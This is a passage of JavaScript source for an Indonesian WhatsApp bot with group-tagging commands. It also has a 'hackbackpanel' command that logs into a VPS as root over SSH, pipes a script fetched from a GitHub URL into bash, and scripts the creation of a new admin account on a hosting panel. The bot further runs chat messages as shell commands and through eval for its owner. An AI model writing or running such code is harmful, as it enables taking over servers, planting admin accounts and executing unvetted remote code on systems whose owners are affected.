Xrzteam.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "tagall": case "tag": {
if (!isGroup) return XrzteamReply(msg.group)
if (!isAdmin && !isOwner) return XrzteamReply(msg.admin)
if (!text) return reply(example("Pesannya"))
var member = await groupMetadata.participants.map(e => e.id)
var teks = ` ${text}\n\n`
member.forEach(e => e !== m.sender ? teks += `@${e.split("@")[0]}\n` : '')
Xrzteam.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break

   case "sc": case "script": {
let teksmenu = `
Haii @${m.sender.split("@")[0]} 👋\nScript ini dibagikan secara gratis, silahkan unduh script di channel *Rexxa Information*

Link Download: Di saluran rexxa🗿🙏🏻

Sosial Media Developer:
> Youtube: youtube.com/@RexxaaOFFC
> Tele: t.me/rexxadev
`
reply(teksmenu)
}
break

case "hbpanel": case "hackbackpanel": {
if (!isOwner) return XrzteamReply(msg.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await Xrzteam.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return Xrzteam.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return Xrzteam.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
Xrzteam.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
Xrzteam.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return Xrzteam.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return Xrzteam.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
Xrzteam.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})